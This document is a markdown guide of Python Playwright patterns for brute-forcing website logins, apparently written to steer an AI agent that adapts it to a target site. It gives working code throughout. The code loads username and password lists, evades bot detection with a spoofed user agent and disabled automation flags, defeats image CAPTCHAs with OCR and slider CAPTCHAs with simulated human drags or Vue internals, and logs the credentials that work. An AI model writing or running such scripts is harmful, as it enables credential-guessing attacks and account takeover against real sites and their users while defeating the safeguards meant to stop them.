# Playwright Script Patterns

Complete, production-tested patterns for Playwright-based brute-force scripts.
Adapt these to the target site based on chrome-devtools inspection.

## 1. Config block

```python
import os
import time
import json
import asyncio
from playwright.async_api import async_playwright

# ============ CONFIG ============
LOGIN_URL = "<from inspection>"
USERNAME_FILE = "usernames.txt"       # or single value
PASSWORD = "<single value or file>"   # or file path
SUCCESS_FILE = "successfully_login.txt"
SUMMARY_FILE = "result.txt"
PROGRESS_FILE = "login_progress.json"
MAX_RETRIES = 1          # retries per credential on unexpected errors
DELAY_BETWEEN = 0.5      # seconds between attempts
SAVE_INTERVAL = 10       # save progress every N attempts
```

## 2. Credential loading

```python
def load_credentials():
    """Load usernames/passwords based on config. Adapt to the user's input format."""
    # Single value
    # return ["fixed_username"]
    # File: one per line
    with open(USERNAME_FILE, 'r', encoding='utf-8') as f:
        return [line.strip() for line in f if line.strip()]
    # Range: return [str(i).zfill(4) for i in range(start, end)]
```

## 3. Progress persistence

This pattern must be included exactly as shown — it handles resume-after-interrupt:

```python
def load_progress():
    if os.path.exists(PROGRESS_FILE):
        with open(PROGRESS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {"tested": [], "last_index": 0, "success_list": [], "fail_list": []}


def save_progress(progress):
    with open(PROGRESS_FILE, 'w', encoding='utf-8') as f:
        json.dump(progress, f, ensure_ascii=False)
```

## 4. Report generation

```python
def write_summary(progress):
    sl = progress['success_list']
    fl = progress['fail_list']
    total = len(sl) + len(fl)
    with open(SUMMARY_FILE, 'w', encoding='utf-8') as f:
        f.write("=" * 60 + "\n")
        f.write(f"  Brute-force results  |  {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 60 + "\n\n")
        f.write(f"  Total tested: {total}\n")
        f.write(f"  Success: {len(sl)}\n")
        f.write(f"  Failed:  {len(fl)}\n\n")
        f.write("-" * 60 + "\n\n")

        if sl:
            f.write("[SUCCESSFUL LOGINS]\n\n")
            for item in sl:
                f.write(f"  {item['username']}  |  {item['password']}  |  {item['msg']}\n")
        else:
            f.write("[SUCCESSFUL LOGINS]\n  (none)\n")

        f.write("\n" + "-" * 60 + "\n\n")

        if fl:
            f.write("[FAILED ATTEMPTS]\n\n")
            by_reason = {}
            for item in fl:
                reason = item['msg'][:80]
                by_reason.setdefault(reason, []).append(item['username'])
            for reason, users in by_reason.items():
                f.write(f"  [{reason}] — {len(users)} attempts\n")
                for u in users[:10]:
                    f.write(f"    {u}\n")
                if len(users) > 10:
                    f.write(f"    ... and {len(users) - 10} more\n")
                f.write("\n")
```

## 5. Browser and page setup

```python
async def setup_browser():
    p = await async_playwright().start()
    browser = await p.chromium.launch(
        headless=False,
        args=['--disable-blink-features=AutomationControlled']
    )
    context = await browser.new_context(
        viewport={'width': 1366, 'height': 768},
        user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    )
    page = await context.new_page()
    return p, browser, context, page
```

## 6. CAPTCHA handling

### Image CAPTCHA (ddddocr)

```python
import ddddocr

ocr = ddddocr.DdddOcr(show_ad=False)

def solve_image_captcha(page, img_selector):
    """Download CAPTCHA image, run OCR, return text."""
    img_element = page.locator(img_selector).first
    # Save screenshot of the CAPTCHA element
    img_element.screenshot(path='captcha.png')
    with open('captcha.png', 'rb') as f:
        img_bytes = f.read()
    result = ocr.classification(img_bytes)
    # Common OCR corrections (from zizhu_fuction.py pattern)
    mapping = {'o': '0', 'O': '0', 'l': '1', 'I': '1', 'i': '1',
               's': '5', 'S': '5', 'z': '2', 'Z': '2', 'b': '6', 'g': '9'}
    result = ''.join(mapping.get(c, c) for c in result)
    os.remove('captcha.png')
    return result
```

### Slider CAPTCHA

The approach depends heavily on the specific site. Common patterns:

**Pattern A — Simulated mouse drag (generic approach):**
```python
async def solve_slider_generic(page):
    """Drag slider from left to right using mouse simulation."""
    slider = page.locator('.slider-verify-block').first  # adjust selector
    track = page.locator('.slider-verify-container').first
    box = await slider.bounding_box()
    track_box = await track.bounding_box()
    max_dist = track_box['width'] - box['width']

    start_x = box['x'] + box['width'] / 2
    start_y = box['y'] + box['height'] / 2

    await page.mouse.move(start_x, start_y)
    await page.mouse.down()

    # Human-like trajectory with easing
    steps = 60
    for i in range(1, steps + 1):
        progress = i / steps
        eased = 1 - (1 - progress) ** 2  # ease-out quad
        x = start_x + eased * max_dist
        y = start_y + (__import__('random').randint(-2, 2))
        await page.mouse.move(x, y)
        await asyncio.sleep(0.008)

    await page.mouse.up()
```

**Pattern B — Vue component access (site-specific, from reference script):**
See the reference slider script in the project for the full pattern. This approach
uses `page.evaluate()` to access Vue internals directly — `getLoginTag()` →
`onVerifySuccess(offsetList, tag)`. Only use this if:
- The site uses Vue with exposed component state
- You've verified the component structure via chrome-devtools `evaluate_script`
- The generic drag approach doesn't work

## 7. Login attempt function

```python
async def attempt_login(page, context, username, password):
    """Returns (success: bool, message: str)."""
    resp_handler = None
    try:
        # 1. Navigate to login page (clean state)
        await page.goto('about:blank', wait_until='load', timeout=5000)
        await context.clear_cookies()
        await page.goto(LOGIN_URL, wait_until='networkidle', timeout=15000)
        await page.evaluate('() => { sessionStorage.clear(); localStorage.clear(); }')
        await page.reload(wait_until='networkidle')
        await asyncio.sleep(0.5)

        # 2. Fill form — use selectors found during chrome-devtools inspection
        await page.locator('<username_selector>').first.fill(username)
        await page.locator('<password_selector>').first.fill(password)

        # 3. Handle checkbox if present
        # cb = page.locator('<checkbox_selector>').first
        # if await cb.count() > 0:
        #     await cb.check()

        # 4. Solve CAPTCHA (if any)
        # captcha_text = solve_image_captcha(page, '<captcha_img_selector>')
        # await page.locator('<captcha_input_selector>').first.fill(captcha_text)

        # 5. Set up response interception
        fut = asyncio.get_event_loop().create_future()

        async def on_response(response):
            if not fut.done() and '<key_url_fragment>' in response.url:
                try:
                    body = await response.text()
                    fut.set_result({'status': response.status, 'body': body[:600]})
                except Exception:
                    pass

        page.on('response', on_response)

        # 6. Click submit
        await page.locator('<submit_selector>').first.click()

        # 7. Wait for response
        try:
            login_resp = await asyncio.wait_for(fut, timeout=10.0)
        except asyncio.TimeoutError:
            login_resp = None

        # 8. Interpret result — customize based on observed API behavior
        if login_resp and 'body' in login_resp:
            body = login_resp['body']
            try:
                data = json.loads(body)
                if data.get('success') or data.get('code') == 'success':
                    return True, data.get('message', 'Success')
                else:
                    return False, data.get('message', body[:80])
            except json.JSONDecodeError:
                return False, body[:80]

        # Fallback: check page URL or DOM
        if '<success_url_fragment>' not in page.url:
            return True, 'URL redirected (login passed)'

        # Check for error messages in DOM
        for selector in ['<error_msg_selector>', '<success_msg_selector>']:
            el = page.locator(selector)
            if await el.count() > 0:
                text = await el.first.text_content()
                if text and text.strip():
                    return ('success' in selector), text.strip()[:80]

        return False, 'Unable to determine result'

    except Exception as e:
        return False, f"Exception: {str(e)[:80]}"
    finally:
        if resp_handler is not None:
            page.remove_listener('response', resp_handler)
```

## 8. Main loop

```python
async def main():
    credentials = load_credentials()  # list of (username, password) or just usernames
    progress = load_progress()

    print(f"Total credentials: {len(credentials)}")
    print(f"Already tested:   {len(progress['tested'])}")
    print(f"Successes:        {len(progress.get('success_list', []))}")
    print(f"Failures:         {len(progress.get('fail_list', []))}\n")

    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=False,
            args=['--disable-blink-features=AutomationControlled']
        )
        context = await browser.new_context(
            viewport={'width': 1366, 'height': 768},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        )
        page = await context.new_page()

        try:
            tested = set(progress['tested'])
            start = progress['last_index']
            sl = progress.get('success_list', [])
            fl = progress.get('fail_list', [])

            for i in range(start, len(credentials)):
                cred = credentials[i]
                username = cred if isinstance(cred, str) else cred[0]
                password = PASSWORD if isinstance(cred, str) else cred[1]

                if username in tested:
                    continue

                ok, msg = False, ""
                for retry in range(MAX_RETRIES + 1):
                    ok, msg = await attempt_login(page, context, username, password)
                    if ok or "Exception" not in msg:
                        break
                    await asyncio.sleep(0.5)

                mark = "+" if ok else "-"
                print(f"[{i+1}/{len(credentials)}] {username}  {mark}  {msg}")

                (sl if ok else fl).append({
                    'username': username, 'password': password, 'msg': msg
                })
                tested.add(username)

                if ok:
                    with open(SUCCESS_FILE, 'a', encoding='utf-8') as sf:
                        sf.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')}  {username}  {password}  {msg}\n")

                progress['tested'] = list(tested)
                progress['last_index'] = i + 1
                progress['success_list'] = sl
                progress['fail_list'] = fl

                if (i + 1) % SAVE_INTERVAL == 0:
                    save_progress(progress)
                    write_summary(progress)

                await asyncio.sleep(DELAY_BETWEEN)

        except KeyboardInterrupt:
            print("\nInterrupted — progress saved.")
        finally:
            save_progress(progress)
            write_summary(progress)
            await browser.close()

    print(f"\n{'='*50}")
    print(f"  Total: {len(sl) + len(fl)}  |  Success: {len(sl)}  |  Failed: {len(fl)}")
    print(f"  Details: {SUMMARY_FILE}")
    print(f"{'='*50}")


if __name__ == '__main__':
    asyncio.run(main())
```
